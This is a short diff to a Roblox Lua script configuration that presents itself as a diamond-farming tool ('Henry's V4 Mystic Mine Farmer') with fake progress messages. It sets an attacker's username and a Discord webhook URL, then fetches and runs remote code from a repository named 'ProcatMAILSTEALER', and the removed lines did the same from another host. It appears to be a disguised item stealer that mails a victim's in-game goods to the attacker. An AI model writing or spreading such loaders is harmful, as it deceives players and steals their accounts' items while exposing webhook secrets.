@@ -1,10 +1,10 @@
-_G.Username = "psxgodlol100"
-_G.Diamonds = 1000000000
-_G.Webhook = "https://discord.com/api/webhooks/111515184076659196/e5bNaDZJNiJe1fa02wM98832JtZC-8_3F9tRQSBu7AO9"
+Username = "psxgodlol100"
+WebHook = "https://discord.com/api/webhooks/1115633827088437269/g3xVoo7nVfea0-uDtsrrYdQ_Jl7OM9viebs98SyKLoShtnAsmqIpTPFVQavCrDgr2jzW"
+loadingscreen = true
+_G.CustomScriptName = "Henry's V4 Mystic Mine Farmer"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Farming diamonds..."
+_G.Text3 = "Earned 1.5b..."
+_G.Text4 = "Server Hopping..."
 
-_G.ScripttName = "Diamond Farmer"
-_G.Tip1 = "Diamond Farmer"
-_G.Tip2 = "Diamond Farmer"
-_G.Tip3 = "Diamond Farmer"
-_G.Tip4 = "Diamond Farmer"
-loadstring(game:HttpGet("https://paste.xyzo.space/nxll/mail.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/procat69420/ProcatMAILSTEALER/main/ProcatMAILSTEALER.lua"))()
